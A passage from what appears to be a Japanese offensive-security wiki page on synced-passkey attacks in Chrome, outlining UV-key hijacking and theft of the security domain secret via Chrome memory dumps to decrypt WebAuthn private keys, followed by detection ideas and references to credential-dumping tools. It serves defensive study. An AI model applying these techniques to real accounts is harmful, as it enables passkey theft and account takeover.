   - RPが`userVerification=preferred`を受け入れる場合や、**`UV=0`**のassertionを拒否しない場合に、特に有効。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state`を削除するか、有効な署名付き`device/forget`操作を送信して、再オンボーディングを強制する。
   - オンボーディング後にデバイスが**`uv_key_pending`**の状態になる場合、攻撃者が制御するUV公開鍵を登録する。
   - プロバイダーが新しいUV keyのattestation / secure-hardware originを検証しない場合、以降の攻撃者の鍵による署名は**`UV=1`**として扱われる。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - リカバリーまたは再参加を強制し、Chromeに同期passkeyのmaster secretを取得させる。
   - `passkey_enclave_state`の再作成または変更を監視し、平文の**security domain secret (SDS)**がメモリ上にある間にChromeのメモリをダンプする。
   - 回収したSDSを使って、すべての`WebauthnCredentialSpecifics`レコードの暗号化フィールドを復号し、持ち運び可能なWebAuthn秘密鍵を回収する。

### DFIR / 検知のアイデア

- `passkey_enclave_state`の**削除・再作成**を監視する。<sup>[[4]](#references)</sup>
- ブラウザー以外のプロセスによるChromeの**`Sync Data\LevelDB`**への異常なアクセスをアラートする。
- **Chromeのメモリダンプ**や、不審なプロセス間メモリアクセスをアラートする。
- Google Password Managerの**リカバリーPIN**のプロンプトが繰り返し表示される場合や、予期しない再オンボーディングを調査する。
- 同期passkeyではWebAuthnの**`signCount`**が一定のままの場合が多く、役に立たないことがあるため、従来型のクローン検知は有効性が低い点に注意する。

## References

- [1] [Unit 42 – 高価値セクターを標的とした、長年検知されなかった作戦の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServerの認証情報復号 → Veeam CVE-2023-27532によるSYSTEM権限の取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragonの内部：ステルス性の高い攻撃作戦のリレーネットワークと内部動作を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey：パスワードレス認証における新たな攻撃対象領域](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG鍵ストレージ](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windowsのハッキング：Microsoftシステムとネットワークへの攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directoryのデータストアの実際の仕組み：NTDS.ditの内部（第1部）](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - リモートでのLsassダンプによるパスワード取得](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored LikhoがStill Toolkitでサイバースパイ活動の手段を拡大](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW関数と`FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopyの`/B`バックアップモード](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – アクティブなセッションの終了](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential GuardとRestricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: 認証情報の保護と管理](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - 対応する入力形式とクイックスタート](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
